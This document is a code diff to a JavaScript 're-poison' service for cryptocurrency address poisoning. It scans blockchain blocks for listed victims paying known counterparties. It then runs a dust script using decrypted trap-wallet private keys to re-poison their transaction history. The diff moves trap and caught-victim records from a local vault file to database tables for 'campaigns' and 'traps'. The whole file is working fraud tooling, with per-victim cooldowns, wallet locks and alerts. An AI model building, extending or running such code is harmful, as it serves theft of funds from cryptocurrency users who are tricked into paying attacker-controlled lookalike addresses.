@@ -1,5 +1,4 @@
 import 'dotenv/config';
-import fs from 'fs';
 import path from 'path';
 import { fileURLToPath } from 'url';
 import { createPublicClient, http } from 'viem';
@@ -36,7 +35,7 @@ if (supabaseUrl && supabaseServiceKey) {
 
 // --- Config ---
 const {
-  files: { vault: vaultFile, caught: caughtFile }, 
+  files: { caught: caughtFile },
   rpc: { observer: observerRpcUrl },
   rePoison: { cooldownMs, dustRetries, delayBetweenMs },
 } = config;
@@ -48,36 +47,111 @@ let caughtVictimsPollInterval = null;
 let lastBlockProcessed = 0n;
 
 // Async Mutex Lock to prevent RPC exhaustion
-let isScanning = false; 
+let isScanning = false;
 
-// --- Caught victims file (Cross-Process Sync) ---
-const CAUGHT_FILE = caughtFile; 
+// ─── Load caught victims from database ───
 const caughtVictims = new Set();
 
-// Safely load dynamically so it stays synced using an atomic Set replacement
-function loadCaughtVictims() {
+async function loadCaughtVictims() {
+  if (!supabaseService) return;
   try {
-    if (fs.existsSync(CAUGHT_FILE)) {
-      const data = fs.readFileSync(CAUGHT_FILE, 'utf8');
-      
-      // Prevent race conditions if the python script is mid-write (0-byte file)
-      if (data.trim().length === 0) return; 
-      
-      const lines = data.split('\n').map(l => l.trim()).filter(l => l.length > 0);
-      
-      // Build a temporary set to ensure atomic replacement
-      const newSet = new Set(lines.map(addr => addr.toLowerCase()));
-      
+    // Fetch all traps marked as caught for this chain
+    const { data, error } = await supabaseService
+      .from('traps')
+      .select('victim_address')
+      .eq('is_caught', true);
+
+    if (error) {
+      console.warn(`[DEBUG] Supabase query for caught victims failed: ${error.message}`);
+      return;
+    }
+
+    if (data && data.length > 0) {
+      const newSet = new Set(data.map(row => row.victim_address.toLowerCase()));
       caughtVictims.clear();
       newSet.forEach(addr => caughtVictims.add(addr));
+      console.log(`[DEBUG] Loaded ${caughtVictims.size} caught victims from database`);
     }
   } catch (err) {
-    console.warn(`[DEBUG] Could not read caught victims file: ${err.message}`);
+    console.warn(`[DEBUG] Could not load caught victims from DB: ${err.message}`);
   }
 }
-// Initial load
-loadCaughtVictims();
-console.log(`[DEBUG] Initially loaded ${caughtVictims.size} caught victims from ${CAUGHT_FILE}`);
+
+// ─── Load traps from database ───
+async function loadTrapsFromDB() {
+  if (!supabaseService) {
+    console.error('[re_poison] Supabase service not available');
+    process.exit(1);
+  }
+
+  try {
+    // Get all campaigns for this chain
+    const { data: campaigns, error: campError } = await supabaseService
+      .from('campaigns')
+      .select('id')
+      .eq('chain', chainName);
+
+    if (campError) {
+      console.error(`[DEBUG] Failed to fetch campaigns: ${campError.message}`);
+      return 0;
+    }
+
+    if (!campaigns || campaigns.length === 0) {
+      console.log(`[DEBUG] No campaigns found for chain ${chainName}`);
+      return 0;
+    }
+
+    const campaignIds = campaigns.map(c => c.id);
+
+    // Fetch traps for these campaigns
+    const { data: traps, error: trapError } = await supabaseService
+      .from('traps')
+      .select('id, campaign_id, victim_address, trap_address, counterparty_address, trap_private_key_enc')
+      .in('campaign_id', campaignIds);
+
+    if (trapError) {
+      console.error(`[DEBUG] Failed to fetch traps: ${trapError.message}`);
+      return 0;
+    }
+
+    if (!traps || traps.length === 0) {
+      console.log(`[DEBUG] No traps found for campaigns on chain ${chainName}`);
+      return 0;
+    }
+
+    console.log(`[DEBUG] Fetched ${traps.length} traps from database`);
+
+    let loaded = 0;
+    for (const row of traps) {
+      try {
+        const privateKey = decrypt(row.trap_private_key_enc);
+        // Verify the key works
+        // We'll store in victims map
+        const victim = row.victim_address.toLowerCase();
+        const counterparty = row.counterparty_address ? row.counterparty_address.toLowerCase() : null;
+        const campaignId = row.campaign_id;
+
+        // If counterparty is null, we treat as wildcard
+        victims.set(victim, {
+          privateKey,
+          trapAddress: row.trap_address.toLowerCase(),
+          counterparty,
+          lastPoison: 0,
+          campaignId,
+        });
+        loaded++;
+      } catch (err) {
+        console.warn(`[DEBUG] Failed to decrypt trap for victim ${row.victim_address}: ${err.message}`);
+      }
+    }
+
+    console.log(`[DEBUG] Loaded ${loaded} victims from database`);
+    return loaded;
+  } catch (err) {
+    console.error(`[DEBUG] Error loading traps from DB: ${err.message}`);
+    return 0;
+  }
+}
 
 // --- MULTI‑CHAIN ---
 const chainName = config.chain || 'ethereum';
@@ -111,21 +185,19 @@ const DUST_RETRIES = dustRetries || 2;
 const DELAY_BETWEEN_DUST_MS = delayBetweenMs || 2000;
 const EXEC_TIMEOUT_MS = 60000;
 
-// --- Dynamic cooldown limits (from env or defaults) ---
-const MIN_COOLDOWN_MS = parseInt(process.env.MIN_COOLDOWN_MS || '600000', 10);     // 10 min
-const MAX_COOLDOWN_MS = parseInt(process.env.MAX_COOLDOWN_MS || '3600000', 10);   // 1 hour
+// --- Dynamic cooldown limits ---
+const MIN_COOLDOWN_MS = parseInt(process.env.MIN_COOLDOWN_MS || '600000', 10);
+const MAX_COOLDOWN_MS = parseInt(process.env.MAX_COOLDOWN_MS || '3600000', 10);
 
 // --- Deduplication and concurrency control ---
-const processedTxHashes = new Map();  // hash -> timestamp
+const processedTxHashes = new Map();
+const trapLocks = new Map();
 
-// FIX: Change to trapLocks to lock by private key, preventing cross-process nonce collisions
-const trapLocks = new Map();        
-
-// --- Per‑victim statistics & transaction timestamps for dynamic cooldown ---
-const victimStats = new Map();               // victim -> { attempts, successes, failures }
-const victimTxTimestamps = new Map();         // victim -> [timestamp1, timestamp2, ...] (last 10)
+// --- Per‑victim statistics ---
+const victimStats = new Map();
+const victimTxTimestamps = new Map();
 let lastStatsLogTime = 0;
-const STATS_LOG_INTERVAL_MS = 60 * 60 * 1000; // 1 hour
+const STATS_LOG_INTERVAL_MS = 60 * 60 * 1000;
 
 // --- HTTP client for block polling ---
 const client = createPublicClient({
@@ -138,121 +210,33 @@ async function withRpcRetry(fn, context, maxAttempts = 2, baseDelay = 1000, shou
   return withRetry(fn, context, maxAttempts, baseDelay, shouldRetry);
 }
 
-// --- Compute dynamic cooldown for a victim based on their recent tx timestamps ---
+// --- Compute dynamic cooldown ---
 function getDynamicCooldown(victimAddress) {
   const timestamps = victimTxTimestamps.get(victimAddress) || [];
-  if (timestamps.length < 2) return COOLDOWN_MS; 
+  if (timestamps.length < 2) return COOLDOWN_MS;
 
   let intervals = [];
   for (let i = 1; i < timestamps.length; i++) {
     intervals.push(timestamps[i] - timestamps[i-1]);
   }
-  const avgInterval = intervals.reduce((a,b) => a+b, 0) / intervals.length;
+  const avgInterval = intervals.reduce((a, b) => a + b, 0) / intervals.length;
 
   let cooldown = avgInterval * 0.3;
   cooldown = Math.max(MIN_COOLDOWN_MS, Math.min(MAX_COOLDOWN_MS, cooldown));
   return cooldown;
 }
 
-// --- Parse vault (async) ---
-async function parseVault(filePath) {
-  console.log(`[DEBUG] parseVault called for ${filePath}`);
-  if (!fs.existsSync(filePath)) {
-    logger.error(`${filePath} not found.`);
-    process.exit(1);
-  }
-  const lines = fs.readFileSync(filePath, 'utf8').split('\n');
-  console.log(`[DEBUG] Read ${lines.length} lines from vault.`);
-  let loaded = 0;
-  let lineNumber = 0;
-  let errorCount = 0;
-  let skippedNoCampaign = 0;
-
-  for (const rawLine of lines) {
-    lineNumber++;
-    const line = rawLine.trim();
-    if (!line) continue;
-    
-    let decryptedLine;
-    try {
-      decryptedLine = decrypt(line);
-    } catch (e) {
-      errorCount++;
-      continue;
-    }
-    const match = decryptedLine.match(/Victim:\s*(0x[a-fA-F0-9]{40}).*Counterparty:\s*(0x[a-fA-F0-9]{40}).*Key:\s*(0x[a-fA-F0-9]{64})/i);
-    if (match) {
-      const victim = match[1].toLowerCase();
-      const counterparty = match[2].toLowerCase();
-      const privateKey = match[3];
-      
-      let campaignId = null;
-      // Try to lookup campaign from traps table using counterparty (trap address)
-      if (supabaseService) {
-        try {
-          const { data, error } = await supabaseService
-            .from('traps')
-            .select('campaign_id')
-            .eq('trap_address', counterparty)
-            .maybeSingle();
-          if (error) {
-            console.warn(`[DEBUG] Supabase query error for ${counterparty}: ${error.message}`);
-          } else if (data) {
-            campaignId = data.campaign_id;
-          }
-        } catch (err) {
-          console.warn(`[DEBUG] Error looking up campaign for ${counterparty}: ${err.message}`);
-        }
-      }
-      
-      if (!campaignId) {
-        skippedNoCampaign++;
-        // Still store but with null campaign_id – alerts will use global config
-      }
-
-      victims.set(victim, {
-        privateKey,
-        trapAddress: counterparty,
-        counterparty,
-        lastPoison: 0,
-        campaignId,
-      });
-      loaded++;
-    } else {
-      const fallback = decryptedLine.match(/Target:\s*(0x[a-fA-F0-9]{40}).*Key:\s*(0x[a-fA-F0-9]{64})/i);
-      if (fallback) {
-        const victim = fallback[1].toLowerCase();
-        const privateKey = fallback[2];
-        // For fallback, we can't get trap address, so no campaign lookup
-        victims.set(victim, {
-          privateKey,
-          trapAddress: null,
-          counterparty: null,
-          lastPoison: 0,
-          campaignId: null,
-        });
-        loaded++;
-      }
-    }
-  }
-  console.log(`[DEBUG] Finished parsing. Loaded ${loaded} victims, ${errorCount} errors, ${skippedNoCampaign} without campaign.`);
-  logger.info(`Loaded ${loaded} victims from ${filePath}`);
-  return loaded;
-}
-
 // --- Send dust via duster.py ---
 async function sendDust(privateKey, victimAddress, campaignId) {
-  // Construct an absolute path so process managers (like PM2) don't break
   const dusterPath = path.resolve(__dirname, '../tools/duster.py');
-  
-  // Pass campaign_id as environment variable
+
   const env = { ...process.env, CHAIN: chainName };
   if (campaignId) {
     env.CAMPAIGN_ID = campaignId;
   }
-  
+
   const cmd = `python3 ${dusterPath} ${privateKey} ${victimAddress}`;
-  
+
   try {
     const { stdout, stderr } = await execAsync(cmd, { timeout: EXEC_TIMEOUT_MS, env });
     if (stderr) logger.warn(`duster stderr: ${stderr}`);
@@ -281,13 +265,13 @@ async function poisonVictim(victimAddress, privateKey, campaignId) {
   }
   const msg = `Re‑poison complete: ${successCount}/${DUST_RETRIES} dust tx sent to ${victimAddress}`;
   logger.info(msg);
-  
+
   try {
     await sendAlert(`♻️ ${msg}`, 'info', campaignId);
   } catch (err) {
     logger.warn(`Failed to send re-poison summary alert: ${err.message}`);
   }
-  
+
   const entry = victims.get(victimAddress);
   if (entry) entry.lastPoison = Date.now();
 
@@ -311,8 +295,7 @@ async function poisonVictim(victimAddress, privateKey, campaignId) {
 
 // --- Check a single transaction ---
 function checkTransaction(tx) {
-  // Explicitly safeguard null tx.to early return
-  if (!tx || !tx.from || !tx.to || !tx.hash) return; 
+  if (!tx || !tx.from || !tx.to || !tx.hash) return;
 
   const from = tx.from.toLowerCase();
   const to = tx.to.toLowerCase();
@@ -321,9 +304,9 @@ function checkTransaction(tx) {
 
   // Deduplicate
   if (processedTxHashes.has(hash)) return;
-  processedTxHashes.set(hash, now); 
+  processedTxHashes.set(hash, now);
 
-  // Hard Size Cap Memory Management
+  // Size cap
   if (processedTxHashes.size > 50000) {
     const toDelete = Math.min(10000, processedTxHashes.size - 50000);
     let count = 0;
@@ -333,17 +316,17 @@ function checkTransaction(tx) {
     }
   }
 
-  // Caught victim exclusion (Now stays actively synced)
+  // Caught victim exclusion
   if (caughtVictims.has(from)) {
     victims.delete(from);
     return;
   }
 
-  if (!victims.has(from)) return; 
+  if (!victims.has(from)) return;
 
   const entry = victims.get(from);
 
-  // The Counterparty wildcard trigger
+  // Counterparty wildcard check
   if (entry.counterparty && to !== entry.counterparty) {
     return;
   }
@@ -357,9 +340,9 @@ function checkTransaction(tx) {
   const dynamicCooldown = getDynamicCooldown(from);
   if (now - entry.lastPoison < dynamicCooldown) return;
 
-  // FIX: Prevent overlapping poison calls by TRAP WALLET (Private Key)
+  // Prevent overlapping poison calls
   if (trapLocks.get(entry.privateKey)) {
-    console.log(`[DEBUG] Trap wallet for victim ${from} is currently busy. Skipping to prevent nonce collision.`);
+    console.log(`[DEBUG] Trap wallet for victim ${from} is currently busy. Skipping.`);
     return;
   }
   trapLocks.set(entry.privateKey, true);
@@ -369,7 +352,7 @@ function checkTransaction(tx) {
     try {
       const counterpartyMsg = entry.counterparty ? entry.counterparty : "[WILDCARD TARGET]";
       logger.info(`Victim ${from} sent to ${counterpartyMsg}: ${tx.hash}`);
-      
+
       try {
         await sendAlert(`🔔 Victim targeting counterparty\nVictim: ${from}\nCounterparty: ${counterpartyMsg}\nTX: ${tx.hash}`, 'info', entry.campaignId);
       } catch (alertErr) {
@@ -380,15 +363,13 @@ function checkTransaction(tx) {
     } catch (err) {
       logger.error(`Error in async poison task for ${from}: ${err.message}`);
     } finally {
-      // Release the Trap Wallet lock after the python script fully completes
-      trapLocks.delete(entry.privateKey); 
+      trapLocks.delete(entry.privateKey);
     }
   })();
 }
 
 // --- Block scanner ---
 async function scanNewBlocks() {
-  // Polling Mutex lock to prevent Event Loop stacking
   if (isScanning) return;
   isScanning = true;
 
@@ -412,13 +393,13 @@ async function scanNewBlocks() {
         2,
         1000
       );
-      
+
       if (fullBlock && fullBlock.transactions) {
         for (const tx of fullBlock.transactions) {
           try {
             checkTransaction(tx);
           } catch (err) {
-             logger.warn(`Error evaluating tx ${tx.hash}: ${err.message}`);
+            logger.warn(`Error evaluating tx ${tx.hash}: ${err.message}`);
           }
         }
       }
@@ -428,7 +409,7 @@ async function scanNewBlocks() {
   } catch (err) {
     logger.warn(`Block scan error: ${err.message}`);
   } finally {
-    isScanning = false; // Release the Mutex lock
+    isScanning = false;
   }
 }
 
@@ -447,10 +428,10 @@ function startWatcher() {
   })();
 
   blockPollInterval = setInterval(scanNewBlocks, 2000);
-  
-  // Start the cross-process sync interval for caught.txt every 15 seconds
-  caughtVictimsPollInterval = setInterval(loadCaughtVictims, 15000); 
-  
+
+  // Poll caught victims every 15 seconds from DB
+  caughtVictimsPollInterval = setInterval(loadCaughtVictims, 15000);
+
   console.log('[DEBUG] Watcher started.');
 }
 
@@ -465,13 +446,16 @@ onShutdown(async () => {
 });
 
 // --- Main ---
-console.log('[DEBUG] Parsing vault...');
-const loaded = await parseVault(vaultFile);
+console.log('[DEBUG] Loading traps from database...');
+const loaded = await loadTrapsFromDB();
 if (loaded === 0) {
-  logger.error(`No victims loaded from ${vaultFile}. Exiting.`);
+  logger.error(`No victims loaded from database. Exiting.`);
   console.error(`[DEBUG] No victims loaded. Exiting.`);
   process.exit(1);
 }
+
+// Initial load of caught victims
+await loadCaughtVictims();
 
 console.log('[DEBUG] Starting watcher...');
 startWatcher();
